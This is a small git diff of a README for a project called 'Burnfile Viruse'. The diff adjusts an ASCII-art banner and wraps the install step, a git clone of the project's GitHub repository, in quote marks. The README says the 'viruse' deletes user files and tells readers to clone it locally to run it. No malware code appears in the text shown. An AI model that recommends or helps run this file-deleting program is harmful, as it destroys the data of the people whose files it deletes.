@@ -1,6 +1,6 @@
 
 		______                 ______ _ _        _   _ _                     
-		| ___ \                |  ___(_) |      | | | (_)              										| |_/ /_   _ _ __ _ __ | |_   _| | ___  | | | |_ _ __ _   _ ___  ___ 
+		| ___ \                |  ___(_) |      | | | (_)              							| |_/ /_   _ _ __ _ __ | |_   _| | ___  | | | |_ _ __ _   _ ___  ___ 
 		| ___ \ | | | '__| '_ \|  _| | | |/ _ \ | | | | | '__| | | / __|/ _ \
 		| |_/ / |_| | |  | | | | |   | | |  __/ \ \_/ / | |  | |_| \__ \  __/
 		\____/ \__,_|_|  |_| |_\_|   |_|_|\___|  \___/|_|_|   \__,_|___/\___|
@@ -19,8 +19,9 @@ Its delete only user files not windows or linux files.
 ## Installation
 
 To run this viruse, install it locally:
+'''
 $ git clone https://github.com/yogesh-hack/Burnfile_viruse.git
-
+'''
 
 <!-- ## Table of contents
 * [General info](#general-info)
